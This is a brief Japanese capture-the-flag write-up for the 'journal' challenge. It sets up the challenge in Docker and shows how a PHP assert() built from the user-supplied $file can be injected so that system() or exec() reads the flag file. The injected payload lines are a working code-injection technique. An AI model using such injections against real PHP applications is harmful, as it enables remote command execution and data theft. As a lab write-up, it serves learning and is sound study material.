# journal

## 問題 環境構築

### 追加ファイル

- flag.txt

### 実行コマンド

コンテナイメージ作成

```
docker build -t ImaginaryCTF/journal .
```

```
docker run -p 8080:80 --name jounal ImaginaryCTF/journal
```

## bypass

phpファイル

```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```

``$file``をうまい文字列にすることでコマンドを実行するコードを埋め込むことができる

```php
assert("strpos('
system    ','..') === false | exec("cat /flag-kK9PEhVszjyXDTvrZfDO.txt") | strpos('
', '..') === false") or die("Invalid file!");
```

```php
assert("strpos('','..') === false | system("cat /flag-kK9PEhVszjyXDTvrZfDO.txt") | strpos('', '..') === false") or die("Invalid file!");
```

phpのsystem関数はコマンドを実行して出力を表示する関数

[phpマニュアル system](https://www.php.net/manual/ja/function.system.php)

似たような関数でexec関数がある

execは出力しないで変数に格納する

[PHPのsystem関数とexec関数の違いと使い方](https://masanyon.com/php-system-exec/)

## 参考

https://www.cnblogs.com/sijidou/p/10573275.html
